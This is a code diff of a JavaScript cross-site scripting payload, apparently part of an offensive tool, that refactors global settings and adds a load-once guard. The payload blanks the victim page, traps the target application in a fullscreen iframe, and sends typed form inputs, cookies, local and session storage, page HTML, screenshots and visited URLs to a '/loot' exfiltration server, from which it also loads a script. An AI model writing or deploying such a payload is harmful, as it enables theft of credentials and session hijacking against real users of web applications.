@@ -3,160 +3,170 @@
 
 
 
-// Ue fullscreen for actual prod usage
-// not fullscreen shows the XSS laden landing
-// page in the background so you can 
-// tell if you're still where you need to be during
-// development. 
-let fullscreenIframe = true; // Set to true for production use, false for dev
-
-// Whether or not to copy screenshots to background
-// Can make transitions smoother. Sometimes the
-// background page of the iFrame trap flashes through
-// when navigating the app. This hides that a bit
-// by copying the image to the background
-let setBackgroundImage = true;
-
-// What page in the application to start users in
-// Note that if the trap is loading from
-// a reload, it hopefully will automatically
-// load the page the user was on in the iframe
-// when they reloaded the page. Otherwise,
-// they'll start here
-let startingPage = "https://targetapp.possiblymalware.com/wp-admin";
-
-
-// Exfil server
-let exfilServer = "http://localhost:8444";
-
-// Should we exfil the entire HTML code?
-let exfilHTML = true;
-
-
-
-// Helpful variables
-let lastFakeUrl = "";
-
-
-// Slow down the html2canvas
-let loaded = false;
-
-
-// Client session
-var sessionName = "";
-
-// Cookie storage
-var cookieStorageDict = {};
-
-
-// Local storage
-var localStorageDict = {};
-
-
-// Session storage
-var sessionStorageDict = {};
-
-
-// Values for client session identifiers
-const AdjectiveList = [
-	"funky",
-	"smelly",
-	"skunky",
-	"merry",
-	"whimsical",
-	"amusing",
-	"hysterical",
-	"bumfuzzled",
-	"bodacious",
-	"absurd",
-	"animated",
-	"brazen",
-	"cheesy",
-	"clownish",
-	"confident",
-	"crazy",
-	"cuckoo",
-	"deranged",
-	"ludicrous",
-	"playful",
-	"quirky",
-	"screwball",
-	"slapstick",
-	"wacky",
-	"excited",
-	"humorous",
-	"charming",
-	"confident",
-	"fanatical"
-	];
-
-const ColorList = [
-	"blue",
-	"red",
-	"green",
-	"white",
-	"black",
-	"brown",
-	"azure",
-	"pink",
-	"yellow",
-	"silver",
-	"purple",
-	"orange",
-	"grey",
-	"fuchsia",
-	"crimson",
-	"lime",
-	"plum",
-	"olive",
-	"cyan",
-	"ivory",
-	"magenta"
-	];
-
-const MurderCritter = [
-	"kangaroo",
-	"koala",
-	"dropbear",
-	"wombat",
-	"wallaby",
-	"dingo",
-	"emu",
-	"tassiedevil",
-	"platypus",
-	"salty",
-	"kookaburra",
-	"boxjelly",
-	"blueringoctopus",
-	"taipan",
-	"stonefish",
-	"redback",
-	"cassowary",
-	"funnelwebspider",
-	"conesnail"
-	];
-
-
 
 // *******************************************************************************
 
+function initGlobals()
+{
+	console.log("Initializing globals...");
+	// Ue fullscreen for actual prod usage
+	// not fullscreen shows the XSS laden landing
+
+	// page in the background so you can 
+	// tell if you're still where you need to be during
+	// development. 
+	window.taperfullscreenIframe = true; // Set to true for production use, false for dev
+	// Whether or not to copy screenshots to background
+	// Can make transitions smoother. Sometimes the
+	// background page of the iFrame trap flashes through
+	// when navigating the app. This hides that a bit
+	// by copying the image to the background
+	window.tapersetBackgroundImage = true;
+
+	// What page in the application to start users in
+	// Note that if the trap is loading from
+	// a reload, it hopefully will automatically
+	// load the page the user was on in the iframe
+	// when they reloaded the page. Otherwise,
+	// they'll start here
+	window.taperstartingPage = "https://some.app.com";
+
+
+	// Exfil server
+	window.taperexfilServer = "http://localhost:8444";
+
+	// Should we exfil the entire HTML code?
+	window.taperexfilHTML = true;
+
+
+
+	// Helpful variables
+	window.taperlastFakeUrl = "";
+
+
+	// Slow down the html2canvas
+	window.taperloaded = false;
+
+
+	// Client session
+	window.tapersessionName = "";
+
+	// Cookie storage
+	window.tapercookieStorageDict = {};
+
+
+	// Local storage
+	window.taperlocalStorageDict = {};
+
+
+	// Session storage
+	window.tapersessionStorageDict = {};
+}
+
+
+
+// function cleanup(){
+//  		sessionStorage.removeItem("taperClaimAlpha");
+// }
+
+
 function canAccessIframe(iframe) {
-  try {
-    return Boolean(iframe.contentDocument);
-  }
-  catch(e){
-    return false;
-  }
+	try {
+		return Boolean(iframe.contentDocument);
+	}
+	catch(e){
+		return false;
+	}
 }
 
 
 // Generate a session identifier
 function initSession()
 {
+		// Values for client session identifiers
+	const AdjectiveList = [
+		"funky",
+		"smelly",
+		"skunky",
+		"merry",
+		"whimsical",
+		"amusing",
+		"hysterical",
+		"bumfuzzled",
+		"bodacious",
+		"absurd",
+		"animated",
+		"brazen",
+		"cheesy",
+		"clownish",
+		"confident",
+		"crazy",
+		"cuckoo",
+		"deranged",
+		"ludicrous",
+		"playful",
+		"quirky",
+		"screwball",
+		"slapstick",
+		"wacky",
+		"excited",
+		"humorous",
+		"charming",
+		"confident",
+		"fanatical"
+		];
+
+	const ColorList = [
+		"blue",
+		"red",
+		"green",
+		"white",
+		"black",
+		"brown",
+		"azure",
+		"pink",
+		"yellow",
+		"silver",
+		"purple",
+		"orange",
+		"grey",
+		"fuchsia",
+		"crimson",
+		"lime",
+		"plum",
+		"olive",
+		"cyan",
+		"ivory",
+		"magenta"
+		];
+
+	const MurderCritter = [
+		"kangaroo",
+		"koala",
+		"dropbear",
+		"wombat",
+		"wallaby",
+		"dingo",
+		"emu",
+		"tassiedevil",
+		"platypus",
+		"salty",
+		"kookaburra",
+		"boxjelly",
+		"blueringoctopus",
+		"taipan",
+		"stonefish",
+		"redback",
+		"cassowary",
+		"funnelwebspider",
+		"conesnail"
+		];
+
+
 	var adjective = AdjectiveList[Math.floor(Math.random()*AdjectiveList.length)];
 	var color = ColorList[Math.floor(Math.random()*ColorList.length)];
 	var murderer = MurderCritter[Math.floor(Math.random()*MurderCritter.length)];
-	sessionName = adjective + "-" + color + "-" + murderer;
+	tapersessionName = adjective + "-" + color + "-" + murderer;
 }
 
 
@@ -164,11 +174,11 @@ function initSession()
 // Snag a screenshot and ship it
 function sendScreenshot()
 {
-	if (loaded == false)
+	if (taperloaded == false)
 	{
 		console.log("!!! Waiting 3 seconds to init html2canvas!");
 		setTimeout(function () {}, 3000);
-		loaded = true;
+		taperloaded = true;
 	}
 	// console.log("---Snagging screenshot...");
 
@@ -181,11 +191,11 @@ function sendScreenshot()
 
 		//console.log("About to send image....");
 		request = new XMLHttpRequest();request.addEventListener("load", responseHandler);
-		request.open("POST", exfilServer + "/loot/screenshot/" + sessionName);
+		request.open("POST", taperexfilServer + "/loot/screenshot/" + tapersessionName);
 
 
 		// Helps hide flashing of the page when clicking around
-		if (setBackgroundImage)
+		if (tapersetBackgroundImage)
 		{
 			document.body.style.backgroundImage = 'url('+canvas.toDataURL("image/png")+')';
 			document.body.style.backgroundRepeat = "no-repeat";
@@ -229,7 +239,7 @@ function hookInputs()
 				inputName = this.name;
 				inputValue = this.value;
 				request = new XMLHttpRequest();
-				request.open("POST", exfilServer + "/loot/input/" + sessionName);
+				request.open("POST", taperexfilServer + "/loot/input/" + tapersessionName);
 				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 				var jsonObj = new Object();
 				jsonObj["inputName"] = inputName;
@@ -259,15 +269,15 @@ function checkCookies()
 		cookieName = cookieData[0];
 		cookieValue = cookieData[1];
 		// console.log("!!!!!   Checking cookies for: " + cookieName + ", " + cookieValue);
-		if (cookieName in cookieStorageDict)
+		if (cookieName in tapercookieStorageDict)
 		{
 			// console.log("== Existing cookie: " + cookieName);
-			if (cookieStorageDict[cookieName] != cookieValue)
+			if (tapercookieStorageDict[cookieName] != cookieValue)
 			{
 				// Existing cookie, but the value has changed
 				// console.log("     New cookie value: " + cookieValue);
 				// console.log("     Old cookie value: " + cookieStorageDict[cookieName]);
-				cookieStorageDict[cookieName] = cookieValue;
+				tapercookieStorageDict[cookieName] = cookieValue;
 			}
 			else
 			{
@@ -280,12 +290,12 @@ function checkCookies()
 		{
 			// New cookie detected
 			// console.log("++ New cookie: " + cookieName + ", with value: " + cookieValue);
-			cookieStorageDict[cookieName] = cookieValue;
+			tapercookieStorageDict[cookieName] = cookieValue;
 		}
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", exfilServer + "/loot/dessert/" + sessionName);
+		request.open("POST", taperexfilServer + "/loot/dessert/" + tapersessionName);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["cookieName"] = cookieName;
@@ -307,16 +317,16 @@ function checkLocalStorage()
 		value = localStorage.getItem(key)
 		//console.log("~~~ Local storage: {" + key + ", " + value + "}");
 
-		if (key in localStorageDict)
+		if (key in taperlocalStorageDict)
 		{
 			// Existing local storage key
 			//console.log("!!! Existing localstorage key...");
-			if (localStorageDict[key] != value)
+			if (taperlocalStorageDict[key] != value)
 			{
 				// Existing localStorage, but the value has changed
 				// console.log("     New localStorage value: " + value);
 				// console.log("     Old localStorage value: " + localStorageDict[key]);
-				localStorageDict[key] = value;
+				taperlocalStorageDict[key] = value;
 			}
 			else
 			{
@@ -330,13 +340,13 @@ function checkLocalStorage()
 		{
 			// New localStorage entry
 			//console.log("++ New localStorage: " + key + ", with value: " + value);
-			localStorageDict[key] = value;
+			taperlocalStorageDict[key] = value;
 		}
 
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", exfilServer + "/loot/localstore/" + sessionName);
+		request.open("POST", taperexfilServer + "/loot/localstore/" + tapersessionName);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["key"] = key;
@@ -359,16 +369,16 @@ function checkSessionStorage()
 		value = sessionStorage.getItem(key)
 		// console.log("~~~ Session storage: {" + key + ", " + value + "}");
 
-		if (key in sessionStorageDict)
+		if (key in tapersessionStorageDict)
 		{
 			// Existing local storage key
 			//console.log("!!! Existing localstorage key...");
-			if (sessionStorageDict[key] != value)
+			if (tapersessionStorageDict[key] != value)
 			{
 				// Existing localStorage, but the value has changed
 				 // console.log("     New sessionStorage value: " + value);
 				 // console.log("     Old sessionStorage value: " + sessionStorageDict[key]);
-				sessionStorageDict[key] = value;
+				tapersessionStorageDict[key] = value;
 			}
 			else
 			{
@@ -382,13 +392,13 @@ function checkSessionStorage()
 		{
 			// New localStorage entry
 			// console.log("++ New sessionStorage: " + key + ", with value: " + value);
-			sessionStorageDict[key] = value;
+			tapersessionStorageDict[key] = value;
 		}
 
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", exfilServer + "/loot/sessionstore/" + sessionName);
+		request.open("POST", taperexfilServer + "/loot/sessionstore/" + tapersessionName);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["key"] = key;
@@ -407,7 +417,7 @@ function sendHTML()
 	trapHTML = document.getElementById("iframe_a").contentDocument.documentElement.outerHTML;
 
 	request = new XMLHttpRequest();
-	request.open("POST", exfilServer + "/loot/html/" + sessionName);
+	request.open("POST", taperexfilServer + "/loot/html/" + tapersessionName);
 	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 	var jsonObj = new Object();
 	jsonObj["url"] = trapURL;
@@ -444,7 +454,7 @@ function runUpdate()
 		// First click exits the iframe, reloads the normally. 
 		// Second click will properly load the external page. 
 		// Sad to lose the trap through. 
-		window.location = lastFakeUrl;
+		window.location = taperlastFakeUrl;
 	}
 
 
@@ -456,17 +466,17 @@ function runUpdate()
 	// console.log("$$$ href: " + document.getElementById("iframe_a").contentDocument.location.href);
 
 	// New page, let's steal stuff
-	if (lastFakeUrl != fakeUrl)
+	if (taperlastFakeUrl != fakeUrl)
 	{
 		// Handle URL recording
 		console.log("New trap URL, stealing the things: " + fakeUrl);
-		lastFakeUrl = fakeUrl;
+		taperlastFakeUrl = fakeUrl;
 
 		// This needs an API call to report the new page
 		// and take a screenshot maybe, not sure if
 		// screenshot timing will be right yet
 		request = new XMLHttpRequest();
-		request.open("POST", exfilServer + "/loot/location/" + sessionName);
+		request.open("POST", taperexfilServer + "/loot/location/" + tapersessionName);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["url"] = fullUrl;
@@ -480,7 +490,7 @@ function runUpdate()
 		hookInputs();
 
 		// Exfil HTML code
-		if (exfilHTML)
+		if (taperexfilHTML)
 		{
 			sendHTML();
 		}
@@ -529,10 +539,10 @@ function takeOver()
 
 	// Setup our iframe trap
 	var iframe = document.createElement("iframe");
-	iframe.setAttribute("src", startingPage);
+	iframe.setAttribute("src", taperstartingPage);
 	iframe.setAttribute("style", "border:none");
 
-	if (fullscreenIframe)
+	if (taperfullscreenIframe)
 	{
 		console.log("&& Using fullscreen");
 		iframe.style.width  = "100%";
@@ -568,20 +578,52 @@ function takeOver()
 
 }
 
+
+
+
+
 // ********************************************
 // Go time
 
+
+
+
+//if (sessionStorage.getItem("taperClaimDebug")===null)
+if (window.taperClaimDebug != true)
+{
+	//sessionStorage.setItem("taperClaimDebug","optional");
+	window.taperClaimDebug = true;
+	//localStorage.setItem('trapLoaded', 'true');
+
+	// window.addEventListener("visibilitychange", function(e){
+	// 	cleanup();
+	// });
+	// window.addEventListener("beforeunload", function(e){
+	// 	cleanup();
+	// });
+
+	
+	initGlobals();
+
+	console.log("!!!! Loading payload!");
 // Blank the page so it doesn't show through as users 
 // navigate inside the iframe
-document.body.innerHTML = "";
-document.body.outerHTML = "";
+	document.body.innerHTML = "";
+	document.body.outerHTML = "";
 
 
 // Pull in html2canvas
-var js = document.createElement("script");
-js.type = "text/javascript";
-js.src = exfilServer + "/lib/telemhelperlib.js";
-document.body.appendChild(js);
+	var js = document.createElement("script");
+	js.type = "text/javascript";
+	js.src = taperexfilServer + "/lib/telemhelperlib.js";
+
+	this.temp_define = window['define'];
+	document.body.appendChild(js);
+	window['define'] = undefined;
+
+	// document.body.appendChild(js);
+	// document.write('<script type="text/javascript" src="http://localhost:8444/lib/telemhelperlib.js"></script>');
+	console.log("HTML2CANVAS added to DOM");
 
 
 // Pull in jszip
@@ -592,9 +634,18 @@ document.body.appendChild(js);
 
 
 // Pick our session ID
-initSession();
-
+	initSession();
 
 
 // Trap all the things
-takeOver();
+	takeOver();
+
+
+}
+else
+{
+	console.log("++++++ Already loaded payload!");
+}
+
+
+
